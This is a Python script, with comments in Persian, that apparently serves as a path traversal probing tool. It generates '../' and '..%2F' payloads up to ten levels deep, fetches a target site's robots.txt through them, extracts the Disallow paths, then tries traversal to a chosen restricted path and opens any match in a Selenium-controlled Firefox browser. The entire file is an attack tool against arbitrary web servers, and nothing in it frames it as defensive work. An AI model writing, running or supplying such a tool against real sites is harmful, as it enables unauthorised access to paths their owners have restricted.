import requests
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.firefox.options import Options

MAX_DEPTH = 10

# ساخت لیست مسیرهای traversal
def generate_paths(filename):
    payloads = []
    for i in range(MAX_DEPTH):
        raw = "../" * i + filename
        encoded = "..%2F" * i + filename
        payloads.extend([raw, encoded])
    return payloads

# پیدا کردن فایلی مثل robots.txt در مسیرهای مختلف
def find_existing_file(base_url, filename):
    print(f"\n[🔍] Searching for {filename} via path traversal...")
    for path in generate_paths(filename):
        full_url = urljoin(base_url + "/", path)
        print(f"  🔎 Testing: {full_url}")
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200 and "html" not in r.headers.get("Content-Type", ""):
                print(f"  ✅ Found: {full_url}")
                return full_url, r.text
        except Exception as e:
            print(f"  ⚠️ Error on {full_url}")
    print(f"[❌] Could not find {filename}.")
    return None, None

# گرفتن Disallowها
def extract_disallows(robots_content):
    disallows = []
    for line in robots_content.splitlines():
        if line.lower().startswith("disallow:"):
            path = line.split(":", 1)[1].strip()
            disallows.append(path)
    return disallows

# انتخاب مسیر از لیست
def choose_from_list(options):
    print("\n[🧭] Disallowed paths:")
    for idx, item in enumerate(options):
        print(f"  [{idx}] {item}")
    while True:
        choice = input("Select the number of the path to test: ")
        if choice.isdigit() and 0 <= int(choice) < len(options):
            return options[int(choice)]
        print("Invalid choice.")

# باز کردن آدرس در مرورگر
def open_in_browser(url):
    print(f"[🌐] Launching browser for: {url}")
    options = Options()
    options.headless = False
    driver = webdriver.Firefox(options=options)
    driver.get(url)

# اجرای مسیر انتخابی مثل فایل اول
def find_and_open_disallowed(base_url, path):
    filename = path.lstrip("/")  # حذف / ابتدایی
    print(f"\n[🔍] Searching for {filename} via path traversal...")
    for p in generate_paths(filename):
        full_url = urljoin(base_url + "/", p)
        print(f"  🔎 Testing: {full_url}")
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200:
                print(f"  ✅ Found: {full_url}")
                open_in_browser(full_url)
                return
        except:
            print(f"  ⚠️ Error on {full_url}")
    print("[❌] Could not find the selected disallowed path.")

# برنامه اصلی
def main():
    base_url = input("Enter your URL (with https://): ").strip().rstrip("/")

    # مرحله اول: پیدا کردن robots.txt
    robots_url, robots_content = find_existing_file(base_url, "robots.txt")
    if not robots_url:
        return

    # مرحله دوم: گرفتن مسیرها از robots.txt
    disallows = extract_disallows(robots_content)
    if not disallows:
        print("[-] No disallowed paths found.")
        return

    # مرحله سوم: انتخاب مسیر
    chosen = choose_from_list(disallows)

    # مرحله چهارم: پیدا کردن مسیر انتخاب‌شده با traversal
    find_and_open_disallowed(base_url, chosen)

if __name__ == "__main__":
    main()
